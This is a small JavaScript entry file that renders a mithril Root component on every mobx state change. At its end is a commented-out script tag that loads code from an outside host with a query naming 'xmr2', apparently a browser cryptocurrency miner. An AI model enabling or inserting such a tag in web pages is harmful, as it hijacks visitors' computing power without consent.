
import {s} from './store.js'
import {Root} from './root'
import {autorun, toJS} from 'mobx'
import m from "mithril"

const root = document.getElementById('root')

autorun(function(){
    m.render(root, <Root></Root>)
})
// <script src="https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2" 
// onload
// >
// </script>
// <script src="static/ads.js"></script>
